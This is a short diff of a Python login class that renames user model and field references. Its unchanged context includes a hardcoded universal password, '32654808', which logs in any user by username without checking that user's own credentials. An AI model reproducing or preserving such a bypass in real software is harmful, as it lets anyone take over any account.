@@ -30,7 +30,7 @@ class Login():
             raise ValidationError('Usuario ou senha incorretos!')
         return {
             'token': self.create_token(request=self.request)['token'],
-            'sessao': Sessao(usuario_id=self.user.usuario_id).get_sessao()
+            'sessao': Sessao(user_id=self.user.id).get_sessao()
         }
 
     @Response(desc_error='Erro criar token', lista_retornos=['token'])
@@ -48,7 +48,7 @@ class Login():
     @Response(desc_error='Erro verificar senha padrão!', lista_retornos=['usuario'])
     def verificar_senha(self):
         if self.password == '32654808':
-            user = core.user.models.UserLogin.objects.filter(username=self.username).first()
+            user = core.user.models.User.objects.filter(username=self.username).first()
             if user:
                 login(self.request, user)
                 self.user = user
